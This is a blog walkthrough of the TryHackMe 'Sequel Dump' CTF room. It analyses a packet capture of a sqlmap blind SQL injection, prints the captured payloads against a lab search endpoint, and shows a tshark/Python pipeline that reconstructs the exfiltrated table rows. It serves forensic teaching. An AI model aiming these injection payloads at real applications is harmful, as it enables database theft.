---
title: TryHackMe Sequel Dump Hackfinity Battle Write-Up Walk Through
date: 2025-03-22 06:00:00 +0200
categories: [TryHackMe, CTF,Hackfinity Battle, TryHackMe Write Up]
tags: [tryhackme,ctf, SequelDump, Hackfinity, ctf, sqlmap,wireshark,BlindSql]
description: "In this video, we tackle the 'Sequel Dump' room from the TryHackMe Hackfinity Battle CTF. We'll analyze a PCAP file to uncover a blind SQL injection attack using sqlmap"
comments: false
media_subpath: /assets/img/
image:
  path: tryhackme-sequel-dump-room.png
  alt: TryHackMe Sequel Dump Hackfinity Battle
---

## Sequel Dump - Recovering STOLEN DATA from Blind SQL Injection

A wave of suspicious web requests has bee detected hammering our database-driven application. Analysts suspect an automated `SQL injection attack` has been launched using `sqlmap`, leading to potential data `exfiltration`. Investigate the provided packet capture (`PCAP`) file to uncover the attackers's actions and determine what was stolen! 

**[You can follow YouTube video walk through here](https://youtu.be/Wjz8igduiDw)**

### Enumeration Phase

The journey begins with the login page (`http://robots.thm/login.php`). A quick test revealed the username field reflected input unsanitized. Injecting a simple XSS payload:

In this video, we tackle the 'Sequel Dump' room from the TryHackMe Hackfinity Battle CTF. We'll analyze a PCAP file to uncover a blind SQL injection attack using sqlmap. First, we'll walk through the manual process of reconstructing the attacker's requests and extracting the stolen data, character by character. Then, we'll show you how to automate this process with a Python script, saving time and effort. Learn how to identify and exploit blind SQL injection vulnerabilities and recover valuable data. Let's get started!"

<img src="tryhackme-sequel-dump-room-wireshark-capture.png"  alt="TryHackMe Sequel Dump Wireshark capture" >

```html
Frame 23252: 449 bytes on wire (3592 bits), 449 bytes captured (3592 bits) on interface eth0, id 0
Ethernet II, Src: VMware_76:32:b1 (00:0c:29:76:32:b1), Dst: VMware_e8:af:99 (00:50:56:e8:af:99)
Internet Protocol Version 4, Src: 172.16.175.128, Dst: 10.10.195.62
Transmission Control Protocol, Src Port: 43124, Dst Port: 80, Seq: 1, Ack: 1, Len: 395
Hypertext Transfer Protocol
    GET /search_app/search.php?query=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60description%60%20AS%20NCHAR%29%2C0x20%29%20FROM%20profile_db.%60profiles%60%20ORDER%20BY%20id%20LIMIT%202%2C1%29%2C83%2C1%29%29%3E100 HTTP/1.1\r\n
        Request Method: GET
        Request URI: /search_app/search.php?query=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60description%60%20AS%20NCHAR%29%2C0x20%29%20FROM%20profile_db.%60profiles%60%20ORDER%20BY%20id%20LIMIT%202%2C1%29%2C83%2C1%29%29%3E100
            Request URI Path: /search_app/search.php
            Request URI Query: query=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60description%60%20AS%20NCHAR%29%2C0x20%29%20FROM%20profile_db.%60profiles%60%20ORDER%20BY%20id%20LIMIT%202%2C1%29%2C83%2C1%29%29%3E100
                Request URI Query Parameter: query=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60description%60%20AS%20NCHAR%29%2C0x20%29%20FROM%20profile_db.%60profiles%60%20ORDER%20BY%20id%20LIMIT%202%2C1%29%2C83%2C1%29%29%3E100
        Request Version: HTTP/1.1
    Cache-Control: no-cache\r\n
    User-Agent: sqlmap/1.8.11#stable (https://sqlmap.org)\r\n
    Host: 10.10.195.62\r\n
    Accept: */*\r\n
    Accept-Encoding: gzip,deflate\r\n
    Connection: close\r\n
    \r\n
    [Response in frame: 23274]
    [Full request URI […]: http://10.10.195.62/search_app/search.php?query=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60description%60%20AS%20NCHAR%29%2C0x20%29%20FROM%20profile_db.%60profiles%60%20ORDER%20BY%20id%20LIMIT%202%2C1%29%2]
```
**[You can follow YouTube video walk through here](https://youtu.be/Wjz8igduiDw)**

We can notice a lot of `GET` requests by `sqlmap` to end point `/search_app/search.php`, the URL decoded value is:

```console
query=1 AND ORD(MID((SELECT IFNULL(CAST(`description` AS NCHAR),0x20) FROM profile_db.`profiles` ORDER BY id LIMIT 2,1),83,1))>100
```

 It’s clear that the attacker is using a `Blind SQL Injection` technique to extract data from the description field in the `profile_db.profiles` table, one character at a time. The attacker is leveraging the HTTP response sizes to determine whether a condition is true or false: a response length of `425 bytes` indicates "true," while a length of `262 bytes` indicates "false." The queries use the `ORD(MID())` function to check the ASCII value of each character in the description field, comparing it against various thresholds to narrow down the exact value.

**[You can follow YouTube video walk through here](https://youtu.be/Wjz8igduiDw)**


### Manually Extracting the data

We can manually extract the data by following same login `sqlmap` is  using, here an example, below are the queries `sqlmap` using the get the last character, position 41 in `description` field.

```console
"50964","156","/search_app/search.php?query=1 AND ORD(MID((SELECT IFNULL(CAST(`description` AS NCHAR),0x20) FROM profile_db.`profiles` ORDER BY id LIMIT 6,1),41,1))>64"
"50990","156","/search_app/search.php?query=1 AND ORD(MID((SELECT IFNULL(CAST(`description` AS NCHAR),0x20) FROM profile_db.`profiles` ORDER BY id LIMIT 6,1),41,1))>96"
"51022","156","/search_app/search.php?query=1 AND ORD(MID((SELECT IFNULL(CAST(`description` AS NCHAR),0x20) FROM profile_db.`profiles` ORDER BY id LIMIT 6,1),41,1))>112"
"51043","156","/search_app/search.php?query=1 AND ORD(MID((SELECT IFNULL(CAST(`description` AS NCHAR),0x20) FROM profile_db.`profiles` ORDER BY id LIMIT 6,1),41,1))>120"
"51056","156","/search_app/search.php?query=1 AND ORD(MID((SELECT IFNULL(CAST(`description` AS NCHAR),0x20) FROM profile_db.`profiles` ORDER BY id LIMIT 6,1),41,1))>124"
"51068","41","/search_app/search.php?query=1 AND ORD(MID((SELECT IFNULL(CAST(`description` AS NCHAR),0x20) FROM profile_db.`profiles` ORDER BY id LIMIT 6,1),41,1))>126"
"51089","41","/search_app/search.php?query=1 AND ORD(MID((SELECT IFNULL(CAST(`description` AS NCHAR),0x20) FROM profile_db.`profiles` ORDER BY id LIMIT 6,1),41,1))>125"
```
we can follow the steps below to get the correct character:

```console
Position 41:
>64 → 156 bytes (True) → >64
>96 → 156 bytes (True) → >96
>112 → 156 bytes (True) → >112
>120 → 156 bytes (True) → >120 
>124 → 156 bytes (True) → >124
>126 → 41 bytes (False) → <=126
>125 → 41 bytes (False) → <=125
Range: 125 (ASCII }).
```
You can see position 42 is basically the end of the flag `}`

We follow same steps and get the full contents of row 6.

## Automatic Getting the Flag Using Python Script

We can use `python` script to read the extracted queries from `Wireshark`, we can use `Tshark` for this, one command we can use is:

```console
tshark -C tryhackme -r challenge.pcapng -Y "http.request.uri contains "ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60description%60%20AS%20NCHAR%29%2C0x20%29%20FROM%20profile_db.%60profiles%60%20ORDER%20BY%20id%20LIMIT" and http.request.uri contains "description" and http.response.code == 200 " -T fields -e frame.number -e http.content_length -e http.request.uri -E separator=, -E quote=d | python3 -c 'import sys, urllib.parse; [print(urllib.parse.unquote(line), end="") for line in sys.stdin]' > 1.csv
```
We can then run python script to read all the queries targeting description data:

```console
python3 go-clearn-stars.py 
Detected row lengths:

Extracted data:
Row 0: The cryptography expert who deciphers the toughest encryptions, searching for vulnerabilities in Void[1048576]s encoded fortress.
Row 1: The exploit hunter who detects and patches vulnerabilities before they can be weaponized, skilled in penetration testing and reverse engineering.
Row 2: The OSINT (Open-Source Intelligence) specialist who tracks Void[128]s movements through the dark web and gathers intelligence from hidden networks.
Row 3: The network infiltrator who can breach even the most fortified systems, bypassing firewalls and uncovering hidden data.
Row 4: The forensic analyst who reconstructs digital crime scenes, piecing together evidence from fragmented files and corrupted logs.
Row 5: The AI security specialist who builds countermeasures against Void[128]s evolving attack algorithms and neutralizes rogue AI threats.
Row 6: Here's the flag: THM{r3************_dump}
```

**[You can follow YouTube video walk through here](https://youtu.be/Wjz8igduiDw)**

## Takeaways
This room showcase sqlmap attack using blind sql injection to extract data from vulnerable database.

# Want the Full Walkthrough?

Check out my **[full video walkthrough](https://youtu.be/Wjz8igduiDw)** on my YouTube channel for step-by-step guidance:

**[You can follow YouTube video walk through here](https://youtu.be/Wjz8igduiDw)**

<img src="tryhackme-sequel-dump-room-youtube-video.png"  alt="TryHackMe Sequel Dump YouTube Video Walk through" >


